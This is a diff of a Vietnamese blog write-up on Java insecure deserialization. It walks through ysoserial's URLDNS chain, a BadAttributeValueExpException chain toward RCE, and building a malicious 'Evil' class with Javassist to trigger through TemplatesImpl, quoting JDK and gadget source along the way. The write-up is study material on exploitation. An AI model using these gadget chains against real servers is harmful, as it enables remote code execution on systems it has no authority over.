+</span><span class="cm">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
+</span><span class="cm">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
+</span><span class="cm">         * using the serialized object.&lt;/p&gt;
+</span><span class="cm">         *
+</span><span class="cm">         * &lt;b&gt;Potential false negative:&lt;/b&gt;
+</span><span class="cm">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
+</span><span class="cm">         * second resolution.&lt;/p&gt;
+</span><span class="cm">         */</span>
+        <span class="kd">static</span> <span class="kd">class</span> <span class="nc">SilentURLStreamHandler</span> <span class="kd">extends</span> <span class="n">URLStreamHandler</span> <span class="o">{</span>
 
-        public static void main(final String[] args) throws Exception {
-                PayloadRunner.run(URLDNS.class, args);
-        }
+                <span class="kd">protected</span> <span class="n">URLConnection</span> <span class="nf">openConnection</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+                <span class="o">}</span>
 
-        /**
-         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
-         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
-         * using the serialized object.&lt;/p&gt;
-         *
-         * &lt;b&gt;Potential false negative:&lt;/b&gt;
-         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
-         * second resolution.&lt;/p&gt;
-         */
-        static class SilentURLStreamHandler extends URLStreamHandler {
-
-                protected URLConnection openConnection(URL u) throws IOException {
-                        return null;
-                }
-
-                protected synchronized InetAddress getHostAddress(URL u) {
-                        return null;
-                }
-        }
-}
-</code></pre><p>Đây là mã chain trong yoserial-all.jar nó sẽ thực hiện điều này bằng cách khai báo một URL u <code>URL u = new URL(null, url, handler);</code> -&gt; khai báo một ht là hashMap <code>HashMap ht = new HashMap();</code> -&gt; put u vào trong ht -&gt; gọi đến <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1)</code> ở đây ta có thể thấy nó set lại giá trị của hashCode bằng -1 để có thể nhảy đến gadget <code>hashCode = handler.hashCode(this);</code></p>
+                <span class="kd">protected</span> <span class="kd">synchronized</span> <span class="n">InetAddress</span> <span class="nf">getHostAddress</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+                <span class="o">}</span>
+        <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Đây là mã chain trong yoserial-all.jar nó sẽ thực hiện điều này bằng cách khai báo một URL u <code>URL u = new URL(null, url, handler);</code> -&gt; khai báo một ht là hashMap <code>HashMap ht = new HashMap();</code> -&gt; put u vào trong ht -&gt; gọi đến <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1)</code> ở đây ta có thể thấy nó set lại giá trị của hashCode bằng -1 để có thể nhảy đến gadget <code>hashCode = handler.hashCode(this);</code></p>
 <p><img src="https://hackmd.io/_uploads/HkIBoqT2A.png" alt="image"></p>
 <p>Sau khi put URL obj vào ht, HashMap sẽ thay đổi giá trị của trường giá trị hashCode của URL thành giá trị mới khác -1 nên chương trình sẽ không nhảy vào đường &ldquo;bóng&rdquo; mà chúng ta yêu cầu -&gt; vì vậy ngay sau đó sẽ dùng <code>Field f1 = &lt;Some Class&gt;.getDeclaredField(&lt;Field Name&gt;);</code> đây <code>&lt;Some Class&gt;</code> chúng ta có thể là URL.class hoặc gián tiếp như <code>Class.forName(“java.net.URL”)</code> như trong bài java reflection đã được đề cập đến</p>
 <p>Do trường hashCode được khai báo với dạng private cho nên ta không thể thao tác trực tiếp ngay với nó được mà phải <code>f1.setAccessible(true);</code></p>
@@ -491,43 +490,43 @@ Cài đặt môi trường:
 <img src="https://hackmd.io/_uploads/HJC1Wiph0.png" alt="image"></p>
 <p>handler được khai báo như trên là một obj từ class <code>URLStreamHandler</code> ! Đặc điểm của transient field này là khi serialize, nó không được serialize cùng object!</p>
 <p>-&gt; đi vào tìm hashCode của <code>URLStreamHandler</code></p>
-<pre><code>protected int hashCode(URL u) {
-        int h = 0;
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">protected</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">(</span><span class="n">URL</span> <span class="n">u</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">h</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
 
-        // Generate the protocol part.
-        String protocol = u.getProtocol();
-        if (protocol != null)
-            h += protocol.hashCode();
+        <span class="c1">// Generate the protocol part.
+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">protocol</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getProtocol</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">protocol</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="n">h</span> <span class="o">+=</span> <span class="n">protocol</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
 
-        // Generate the host part.
-        InetAddress addr = getHostAddress(u);
-        if (addr != null) {
-            h += addr.hashCode();
-        } else {
-            String host = u.getHost();
-            if (host != null)
-                h += host.toLowerCase().hashCode();
-        }
+        <span class="c1">// Generate the host part.
+</span><span class="c1"></span>        <span class="n">InetAddress</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">getHostAddress</span><span class="o">(</span><span class="n">u</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">addr</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">h</span> <span class="o">+=</span> <span class="n">addr</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">host</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getHost</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">host</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+                <span class="n">h</span> <span class="o">+=</span> <span class="n">host</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">hashCode</span><span class="o">();</span>
+        <span class="o">}</span>
 
-        // Generate the file part.
-        String file = u.getFile();
-        if (file != null)
-            h += file.hashCode();
+        <span class="c1">// Generate the file part.
+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">file</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getFile</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">file</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="n">h</span> <span class="o">+=</span> <span class="n">file</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
 
-        // Generate the port part.
-        if (u.getPort() == -1)
-            h += getDefaultPort();
-        else
-            h += u.getPort();
+        <span class="c1">// Generate the port part.
+</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">u</span><span class="o">.</span><span class="na">getPort</span><span class="o">()</span> <span class="o">==</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span>
+            <span class="n">h</span> <span class="o">+=</span> <span class="n">getDefaultPort</span><span class="o">();</span>
+        <span class="k">else</span>
+            <span class="n">h</span> <span class="o">+=</span> <span class="n">u</span><span class="o">.</span><span class="na">getPort</span><span class="o">();</span>
 
-        // Generate the ref part.
-        String ref = u.getRef();
-        if (ref != null)
-            h += ref.hashCode();
+        <span class="c1">// Generate the ref part.
+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">ref</span> <span class="o">=</span> <span class="n">u</span><span class="o">.</span><span class="na">getRef</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">ref</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="n">h</span> <span class="o">+=</span> <span class="n">ref</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>
 
-        return h;
-    }
-</code></pre><p><img src="https://hackmd.io/_uploads/rk1nMi620.png" alt="image"></p>
+        <span class="k">return</span> <span class="n">h</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div><p><img src="https://hackmd.io/_uploads/rk1nMi620.png" alt="image"></p>
 <p>Để ý <code>InetAddress addr = getHostAddress(u);</code> getHostAddress sẽ nhận url là host là key mà ta truyền vào</p>
 <p><code>protected InetAddress getHostAddress(URL u) { return u.getHostAddress(); }</code></p>
 <p><img src="https://hackmd.io/_uploads/ryPNNiThA.png" alt="image"></p>
@@ -562,28 +561,28 @@ Runtime.exec()</p>
 <p>*/</p>
 <p>Có thể thấy ở đây đi từ BadAttributeValueExpException đến sink là Method.invoke -&gt; ta cùng debug để xem qua trình run của nó</p>
 <p>Như anh tác giả tsug0d và anh Jang đã nói về chain này</p>
-<pre><code>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
-        ObjectInputStream.GetField gf = ois.readFields();
-        Object valObj = gf.get(&quot;val&quot;, null);
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span> <span class="n">ois</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">GetField</span> <span class="n">gf</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readFields</span><span class="o">();</span>
+        <span class="n">Object</span> <span class="n">valObj</span> <span class="o">=</span> <span class="n">gf</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;val&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
 
-        if (valObj == null) {
-            val = null;
-        } else if (valObj instanceof String) {
-            val= valObj;
-        } else if (System.getSecurityManager() == null
-                || valObj instanceof Long
-                || valObj instanceof Integer
-                || valObj instanceof Float
-                || valObj instanceof Double
-                || valObj instanceof Byte
-                || valObj instanceof Short
-                || valObj instanceof Boolean) {
-            val = valObj.toString();
-        } else { // the serialized object is from a version without JDK-8019292 fix
-            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
-        }
-    }
-</code></pre><p>Nếu ta đặt break point tại <code>val = valObj.toString();</code> thì sẽ pop up calc lên luôn vậy tại sao lại xảy ra điều đó khi ta chưa chạy đến sink của gadget là Method.invoke để reflection -&gt; RCE.</p>
+        <span class="k">if</span> <span class="o">(</span><span class="n">valObj</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">val</span><span class="o">=</span> <span class="n">valObj</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getSecurityManager</span><span class="o">()</span> <span class="o">==</span> <span class="kc">null</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Long</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Integer</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Float</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Double</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Byte</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Short</span>
+                <span class="o">||</span> <span class="n">valObj</span> <span class="k">instanceof</span> <span class="n">Boolean</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">val</span> <span class="o">=</span> <span class="n">valObj</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="c1">// the serialized object is from a version without JDK-8019292 fix
+</span><span class="c1"></span>            <span class="n">val</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">identityHashCode</span><span class="o">(</span><span class="n">valObj</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;@&#34;</span> <span class="o">+</span> <span class="n">valObj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></div><p>Nếu ta đặt break point tại <code>val = valObj.toString();</code> thì sẽ pop up calc lên luôn vậy tại sao lại xảy ra điều đó khi ta chưa chạy đến sink của gadget là Method.invoke để reflection -&gt; RCE.</p>
 <p>-&gt; do đây là một tính năng của IntelliJ debugger:</p>
 <p>-&gt; khi dừng lại 1 b* của trình debbugger thì ide sẽ cố gắng lấy tất cả giá trị của các biến trước khi đến b*  -&gt; nó sẽ nhận dữ liệu đầu vào dưới dang object và khả năng muốn chuyển thành string để người dùng có thể đọc -&gt; vì vậy nó đã ngầm invoke method toString -&gt; lúc này các chain ở đẳng sau sẽ tự động gadget vào luôn.</p>
 <p>Do đó nên ta sẽ đi tìm nơi đặt b* khác để không bị pop up calc trước khi đến sink ta sẽ tìm b* ở class khác của gadget</p>
@@ -758,15 +757,15 @@ ClassPool là một container của CtClass objects từ đó có thể lấy đ
 <p><img src="https://hackmd.io/_uploads/Sy4wTTG6C.png" alt="image"></p>
 <p>pool có kiểu class là ClassPool được gán giá trị là ClassPool.getDefault();</p>
 <p>Có thể thấy method này như sau:</p>
-<pre><code>public static synchronized ClassPool getDefault() {
-        if (defaultPool == null) {
-            defaultPool = new ClassPool((ClassPool)null);
-            defaultPool.appendSystemPath();
-        }
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kd">synchronized</span> <span class="n">ClassPool</span> <span class="nf">getDefault</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">defaultPool</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">defaultPool</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassPool</span><span class="o">((</span><span class="n">ClassPool</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
+            <span class="n">defaultPool</span><span class="o">.</span><span class="na">appendSystemPath</span><span class="o">();</span>
+        <span class="o">}</span>
 
-        return defaultPool;
-    }
-</code></pre><p>nó sẽ tạo một classPool mới -&gt; gọi appenSytemPath() sau đó trả ra obj này -&gt; do đó nó sẽ trả về một default classPool vì nó truyền tham số là null -&gt; nó sẽ tìm những system class path là đường dẫn đến các object trong thư mục</p>
+        <span class="k">return</span> <span class="n">defaultPool</span><span class="o">;</span>
+    <span class="o">}</span>
+</code></pre></div><p>nó sẽ tạo một classPool mới -&gt; gọi appenSytemPath() sau đó trả ra obj này -&gt; do đó nó sẽ trả về một default classPool vì nó truyền tham số là null -&gt; nó sẽ tìm những system class path là đường dẫn đến các object trong thư mục</p>
 <p><img src="https://hackmd.io/_uploads/BySRJ0faC.png" alt="image"></p>
 <p>-&gt; theo sau đó mình cung cấp class path của object hiện tại cho nó, nếu mà server chạy trên Jboss hoặc tomcat của user thông thường thì chương tringh sẽ không tìm thấy nó và chúng ta cần phải dùng <code>pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</code> để nó có thấy xác định chính xác</p>
 <p><code>CtClass EvilClass = pool.makeClass(&quot;Evil&quot;);</code> tạo một class có tên là Evil -&gt; nó sẽ kế thừa các thuộc tính <code> EvilClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</code> -&gt; tạo một static contructor <code>CtConstructor constructor = test.makeClassInitializer();</code></p>
@@ -836,36 +835,36 @@ ClassPool là một container của CtClass objects từ đó có thể lấy đ
 </code></pre><p>và mục đích ta cũng sẽ gọi đến method defineClass của gadget trên qua method defineClass của nó với tham số là _bytecode[i]</p>
 <p>để ý đây là một private field của class TemplatesImpl do đó ta muốn access vào cần phải sử dụng java reflection. Nhưng trước tiên ta cần tìm gadget để gọi đến nó:</p>
 <p>ở đây ta sẽ dùng:</p>
-<pre><code>private Translet getTransletInstance()
-        throws TransformerConfigurationException {
-        try {
-            if (_name == null) return null;
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="n">Translet</span> <span class="nf">getTransletInstance</span><span class="o">()</span>
+        <span class="kd">throws</span> <span class="n">TransformerConfigurationException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">_name</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
 
-            if (_class == null) defineTransletClasses();
+            <span class="k">if</span> <span class="o">(</span><span class="n">_class</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="n">defineTransletClasses</span><span class="o">();</span>
 
-            // The translet needs to keep a reference to all its auxiliary
-            // class to prevent the GC from collecting them
-            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
-            translet.postInitialization();
-            translet.setTemplates(this);
-            translet.setServicesMechnism(_useServicesMechanism);
-            translet.setAllowedProtocols(_accessExternalStylesheet);
-            if (_auxClasses != null) {
-                translet.setAuxiliaryClasses(_auxClasses);
-            }
+            <span class="c1">// The translet needs to keep a reference to all its auxiliary
+</span><span class="c1"></span>            <span class="c1">// class to prevent the GC from collecting them
+</span><span class="c1"></span>            <span class="n">AbstractTranslet</span> <span class="n">translet</span> <span class="o">=</span> <span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">)</span> <span class="n">_class</span><span class="o">[</span><span class="n">_transletIndex</span><span class="o">].</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">translet</span><span class="o">.</span><span class="na">postInitialization</span><span class="o">();</span>
+            <span class="n">translet</span><span class="o">.</span><span class="na">setTemplates</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+            <span class="n">translet</span><span class="o">.</span><span class="na">setServicesMechnism</span><span class="o">(</span><span class="n">_useServicesMechanism</span><span class="o">);</span>
+            <span class="n">translet</span><span class="o">.</span><span class="na">setAllowedProtocols</span><span class="o">(</span><span class="n">_accessExternalStylesheet</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">_auxClasses</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">translet</span><span class="o">.</span><span class="na">setAuxiliaryClasses</span><span class="o">(</span><span class="n">_auxClasses</span><span class="o">);</span>
+            <span class="o">}</span>
 
-            return translet;
-        }
-        catch (InstantiationException e) {
-            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
-            throw new TransformerConfigurationException(err.toString());
-        }
-        catch (IllegalAccessException e) {
-            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
-            throw new TransformerConfigurationException(err.toString());
-        }
-    }
-</code></pre><p>getTransletInstance cí method newwInstance sẽ match với source ta test ở trên -&gt; thực thi code trong evil class.</p>
+            <span class="k">return</span> <span class="n">translet</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="n">InstantiationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></div><p>getTransletInstance cí method newwInstance sẽ match với source ta test ở trên -&gt; thực thi code trong evil class.</p>
 <p>Điều kiện set _name != null và _class = null -&gt; ta dùng reflectAPI để set lại value cho chúng</p>
 <p>Cuối cùng để trigger đến gadget trên thì ta cần dùng:</p>
 <p><img src="https://hackmd.io/_uploads/BJqi9kQ60.png" alt="image"></p>
@@ -968,11 +967,11 @@ ClassPool là một container của CtClass objects từ đó có thể lấy đ
 <p><img src="https://hackmd.io/_uploads/Hyt-GWMp0.png" alt="image"></p>
 <p>passHandle có giá trị là 1 và outerHandler được gán bằng nó -&gt; đi vào khối lệnh try catch</p>
 <p>try catch bắt lỗi cuối cùng gán:</p>
-<pre><code>passHandle = outerHandle;
-            if (closed &amp;&amp; depth == 0) {
-                clear();
-            }
-</code></pre><p>và gọi clear() -&gt; quay trở lại khối lệnh try lúc này passHandle có giá trị là 2</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">passHandle</span> <span class="o">=</span> <span class="n">outerHandle</span><span class="o">;</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">closed</span> <span class="o">&amp;&amp;</span> <span class="n">depth</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">clear</span><span class="o">();</span>
+            <span class="o">}</span>
+</code></pre></div><p>và gọi clear() -&gt; quay trở lại khối lệnh try lúc này passHandle có giá trị là 2</p>
 <p><img src="https://hackmd.io/_uploads/ByEmnWfTA.png" alt="image"></p>
 <p>handles được khởi tạo từ class HandleTable</p>
 <p><code>handles = new HandleTable(10);</code></p>
@@ -1188,7 +1187,7 @@ Nó <code>Iterator var3 = this.memberValues.entrySet().iterator();</code> đư�
           
           
             <li class="next">
-              <a href="https://l3mnt2010.github.io/insecure-deserialization-lab/" data-toggle="tooltip" data-placement="top" title="Insecure-deserialization-lab">Next Post &rarr;</a>
+              <a href="https://l3mnt2010.github.io/insecure-deserialization-lab/" data-toggle="tooltip" data-placement="top" title="Insecure deserialization lab">Next Post &rarr;</a>
             </li>
           
         </ul>
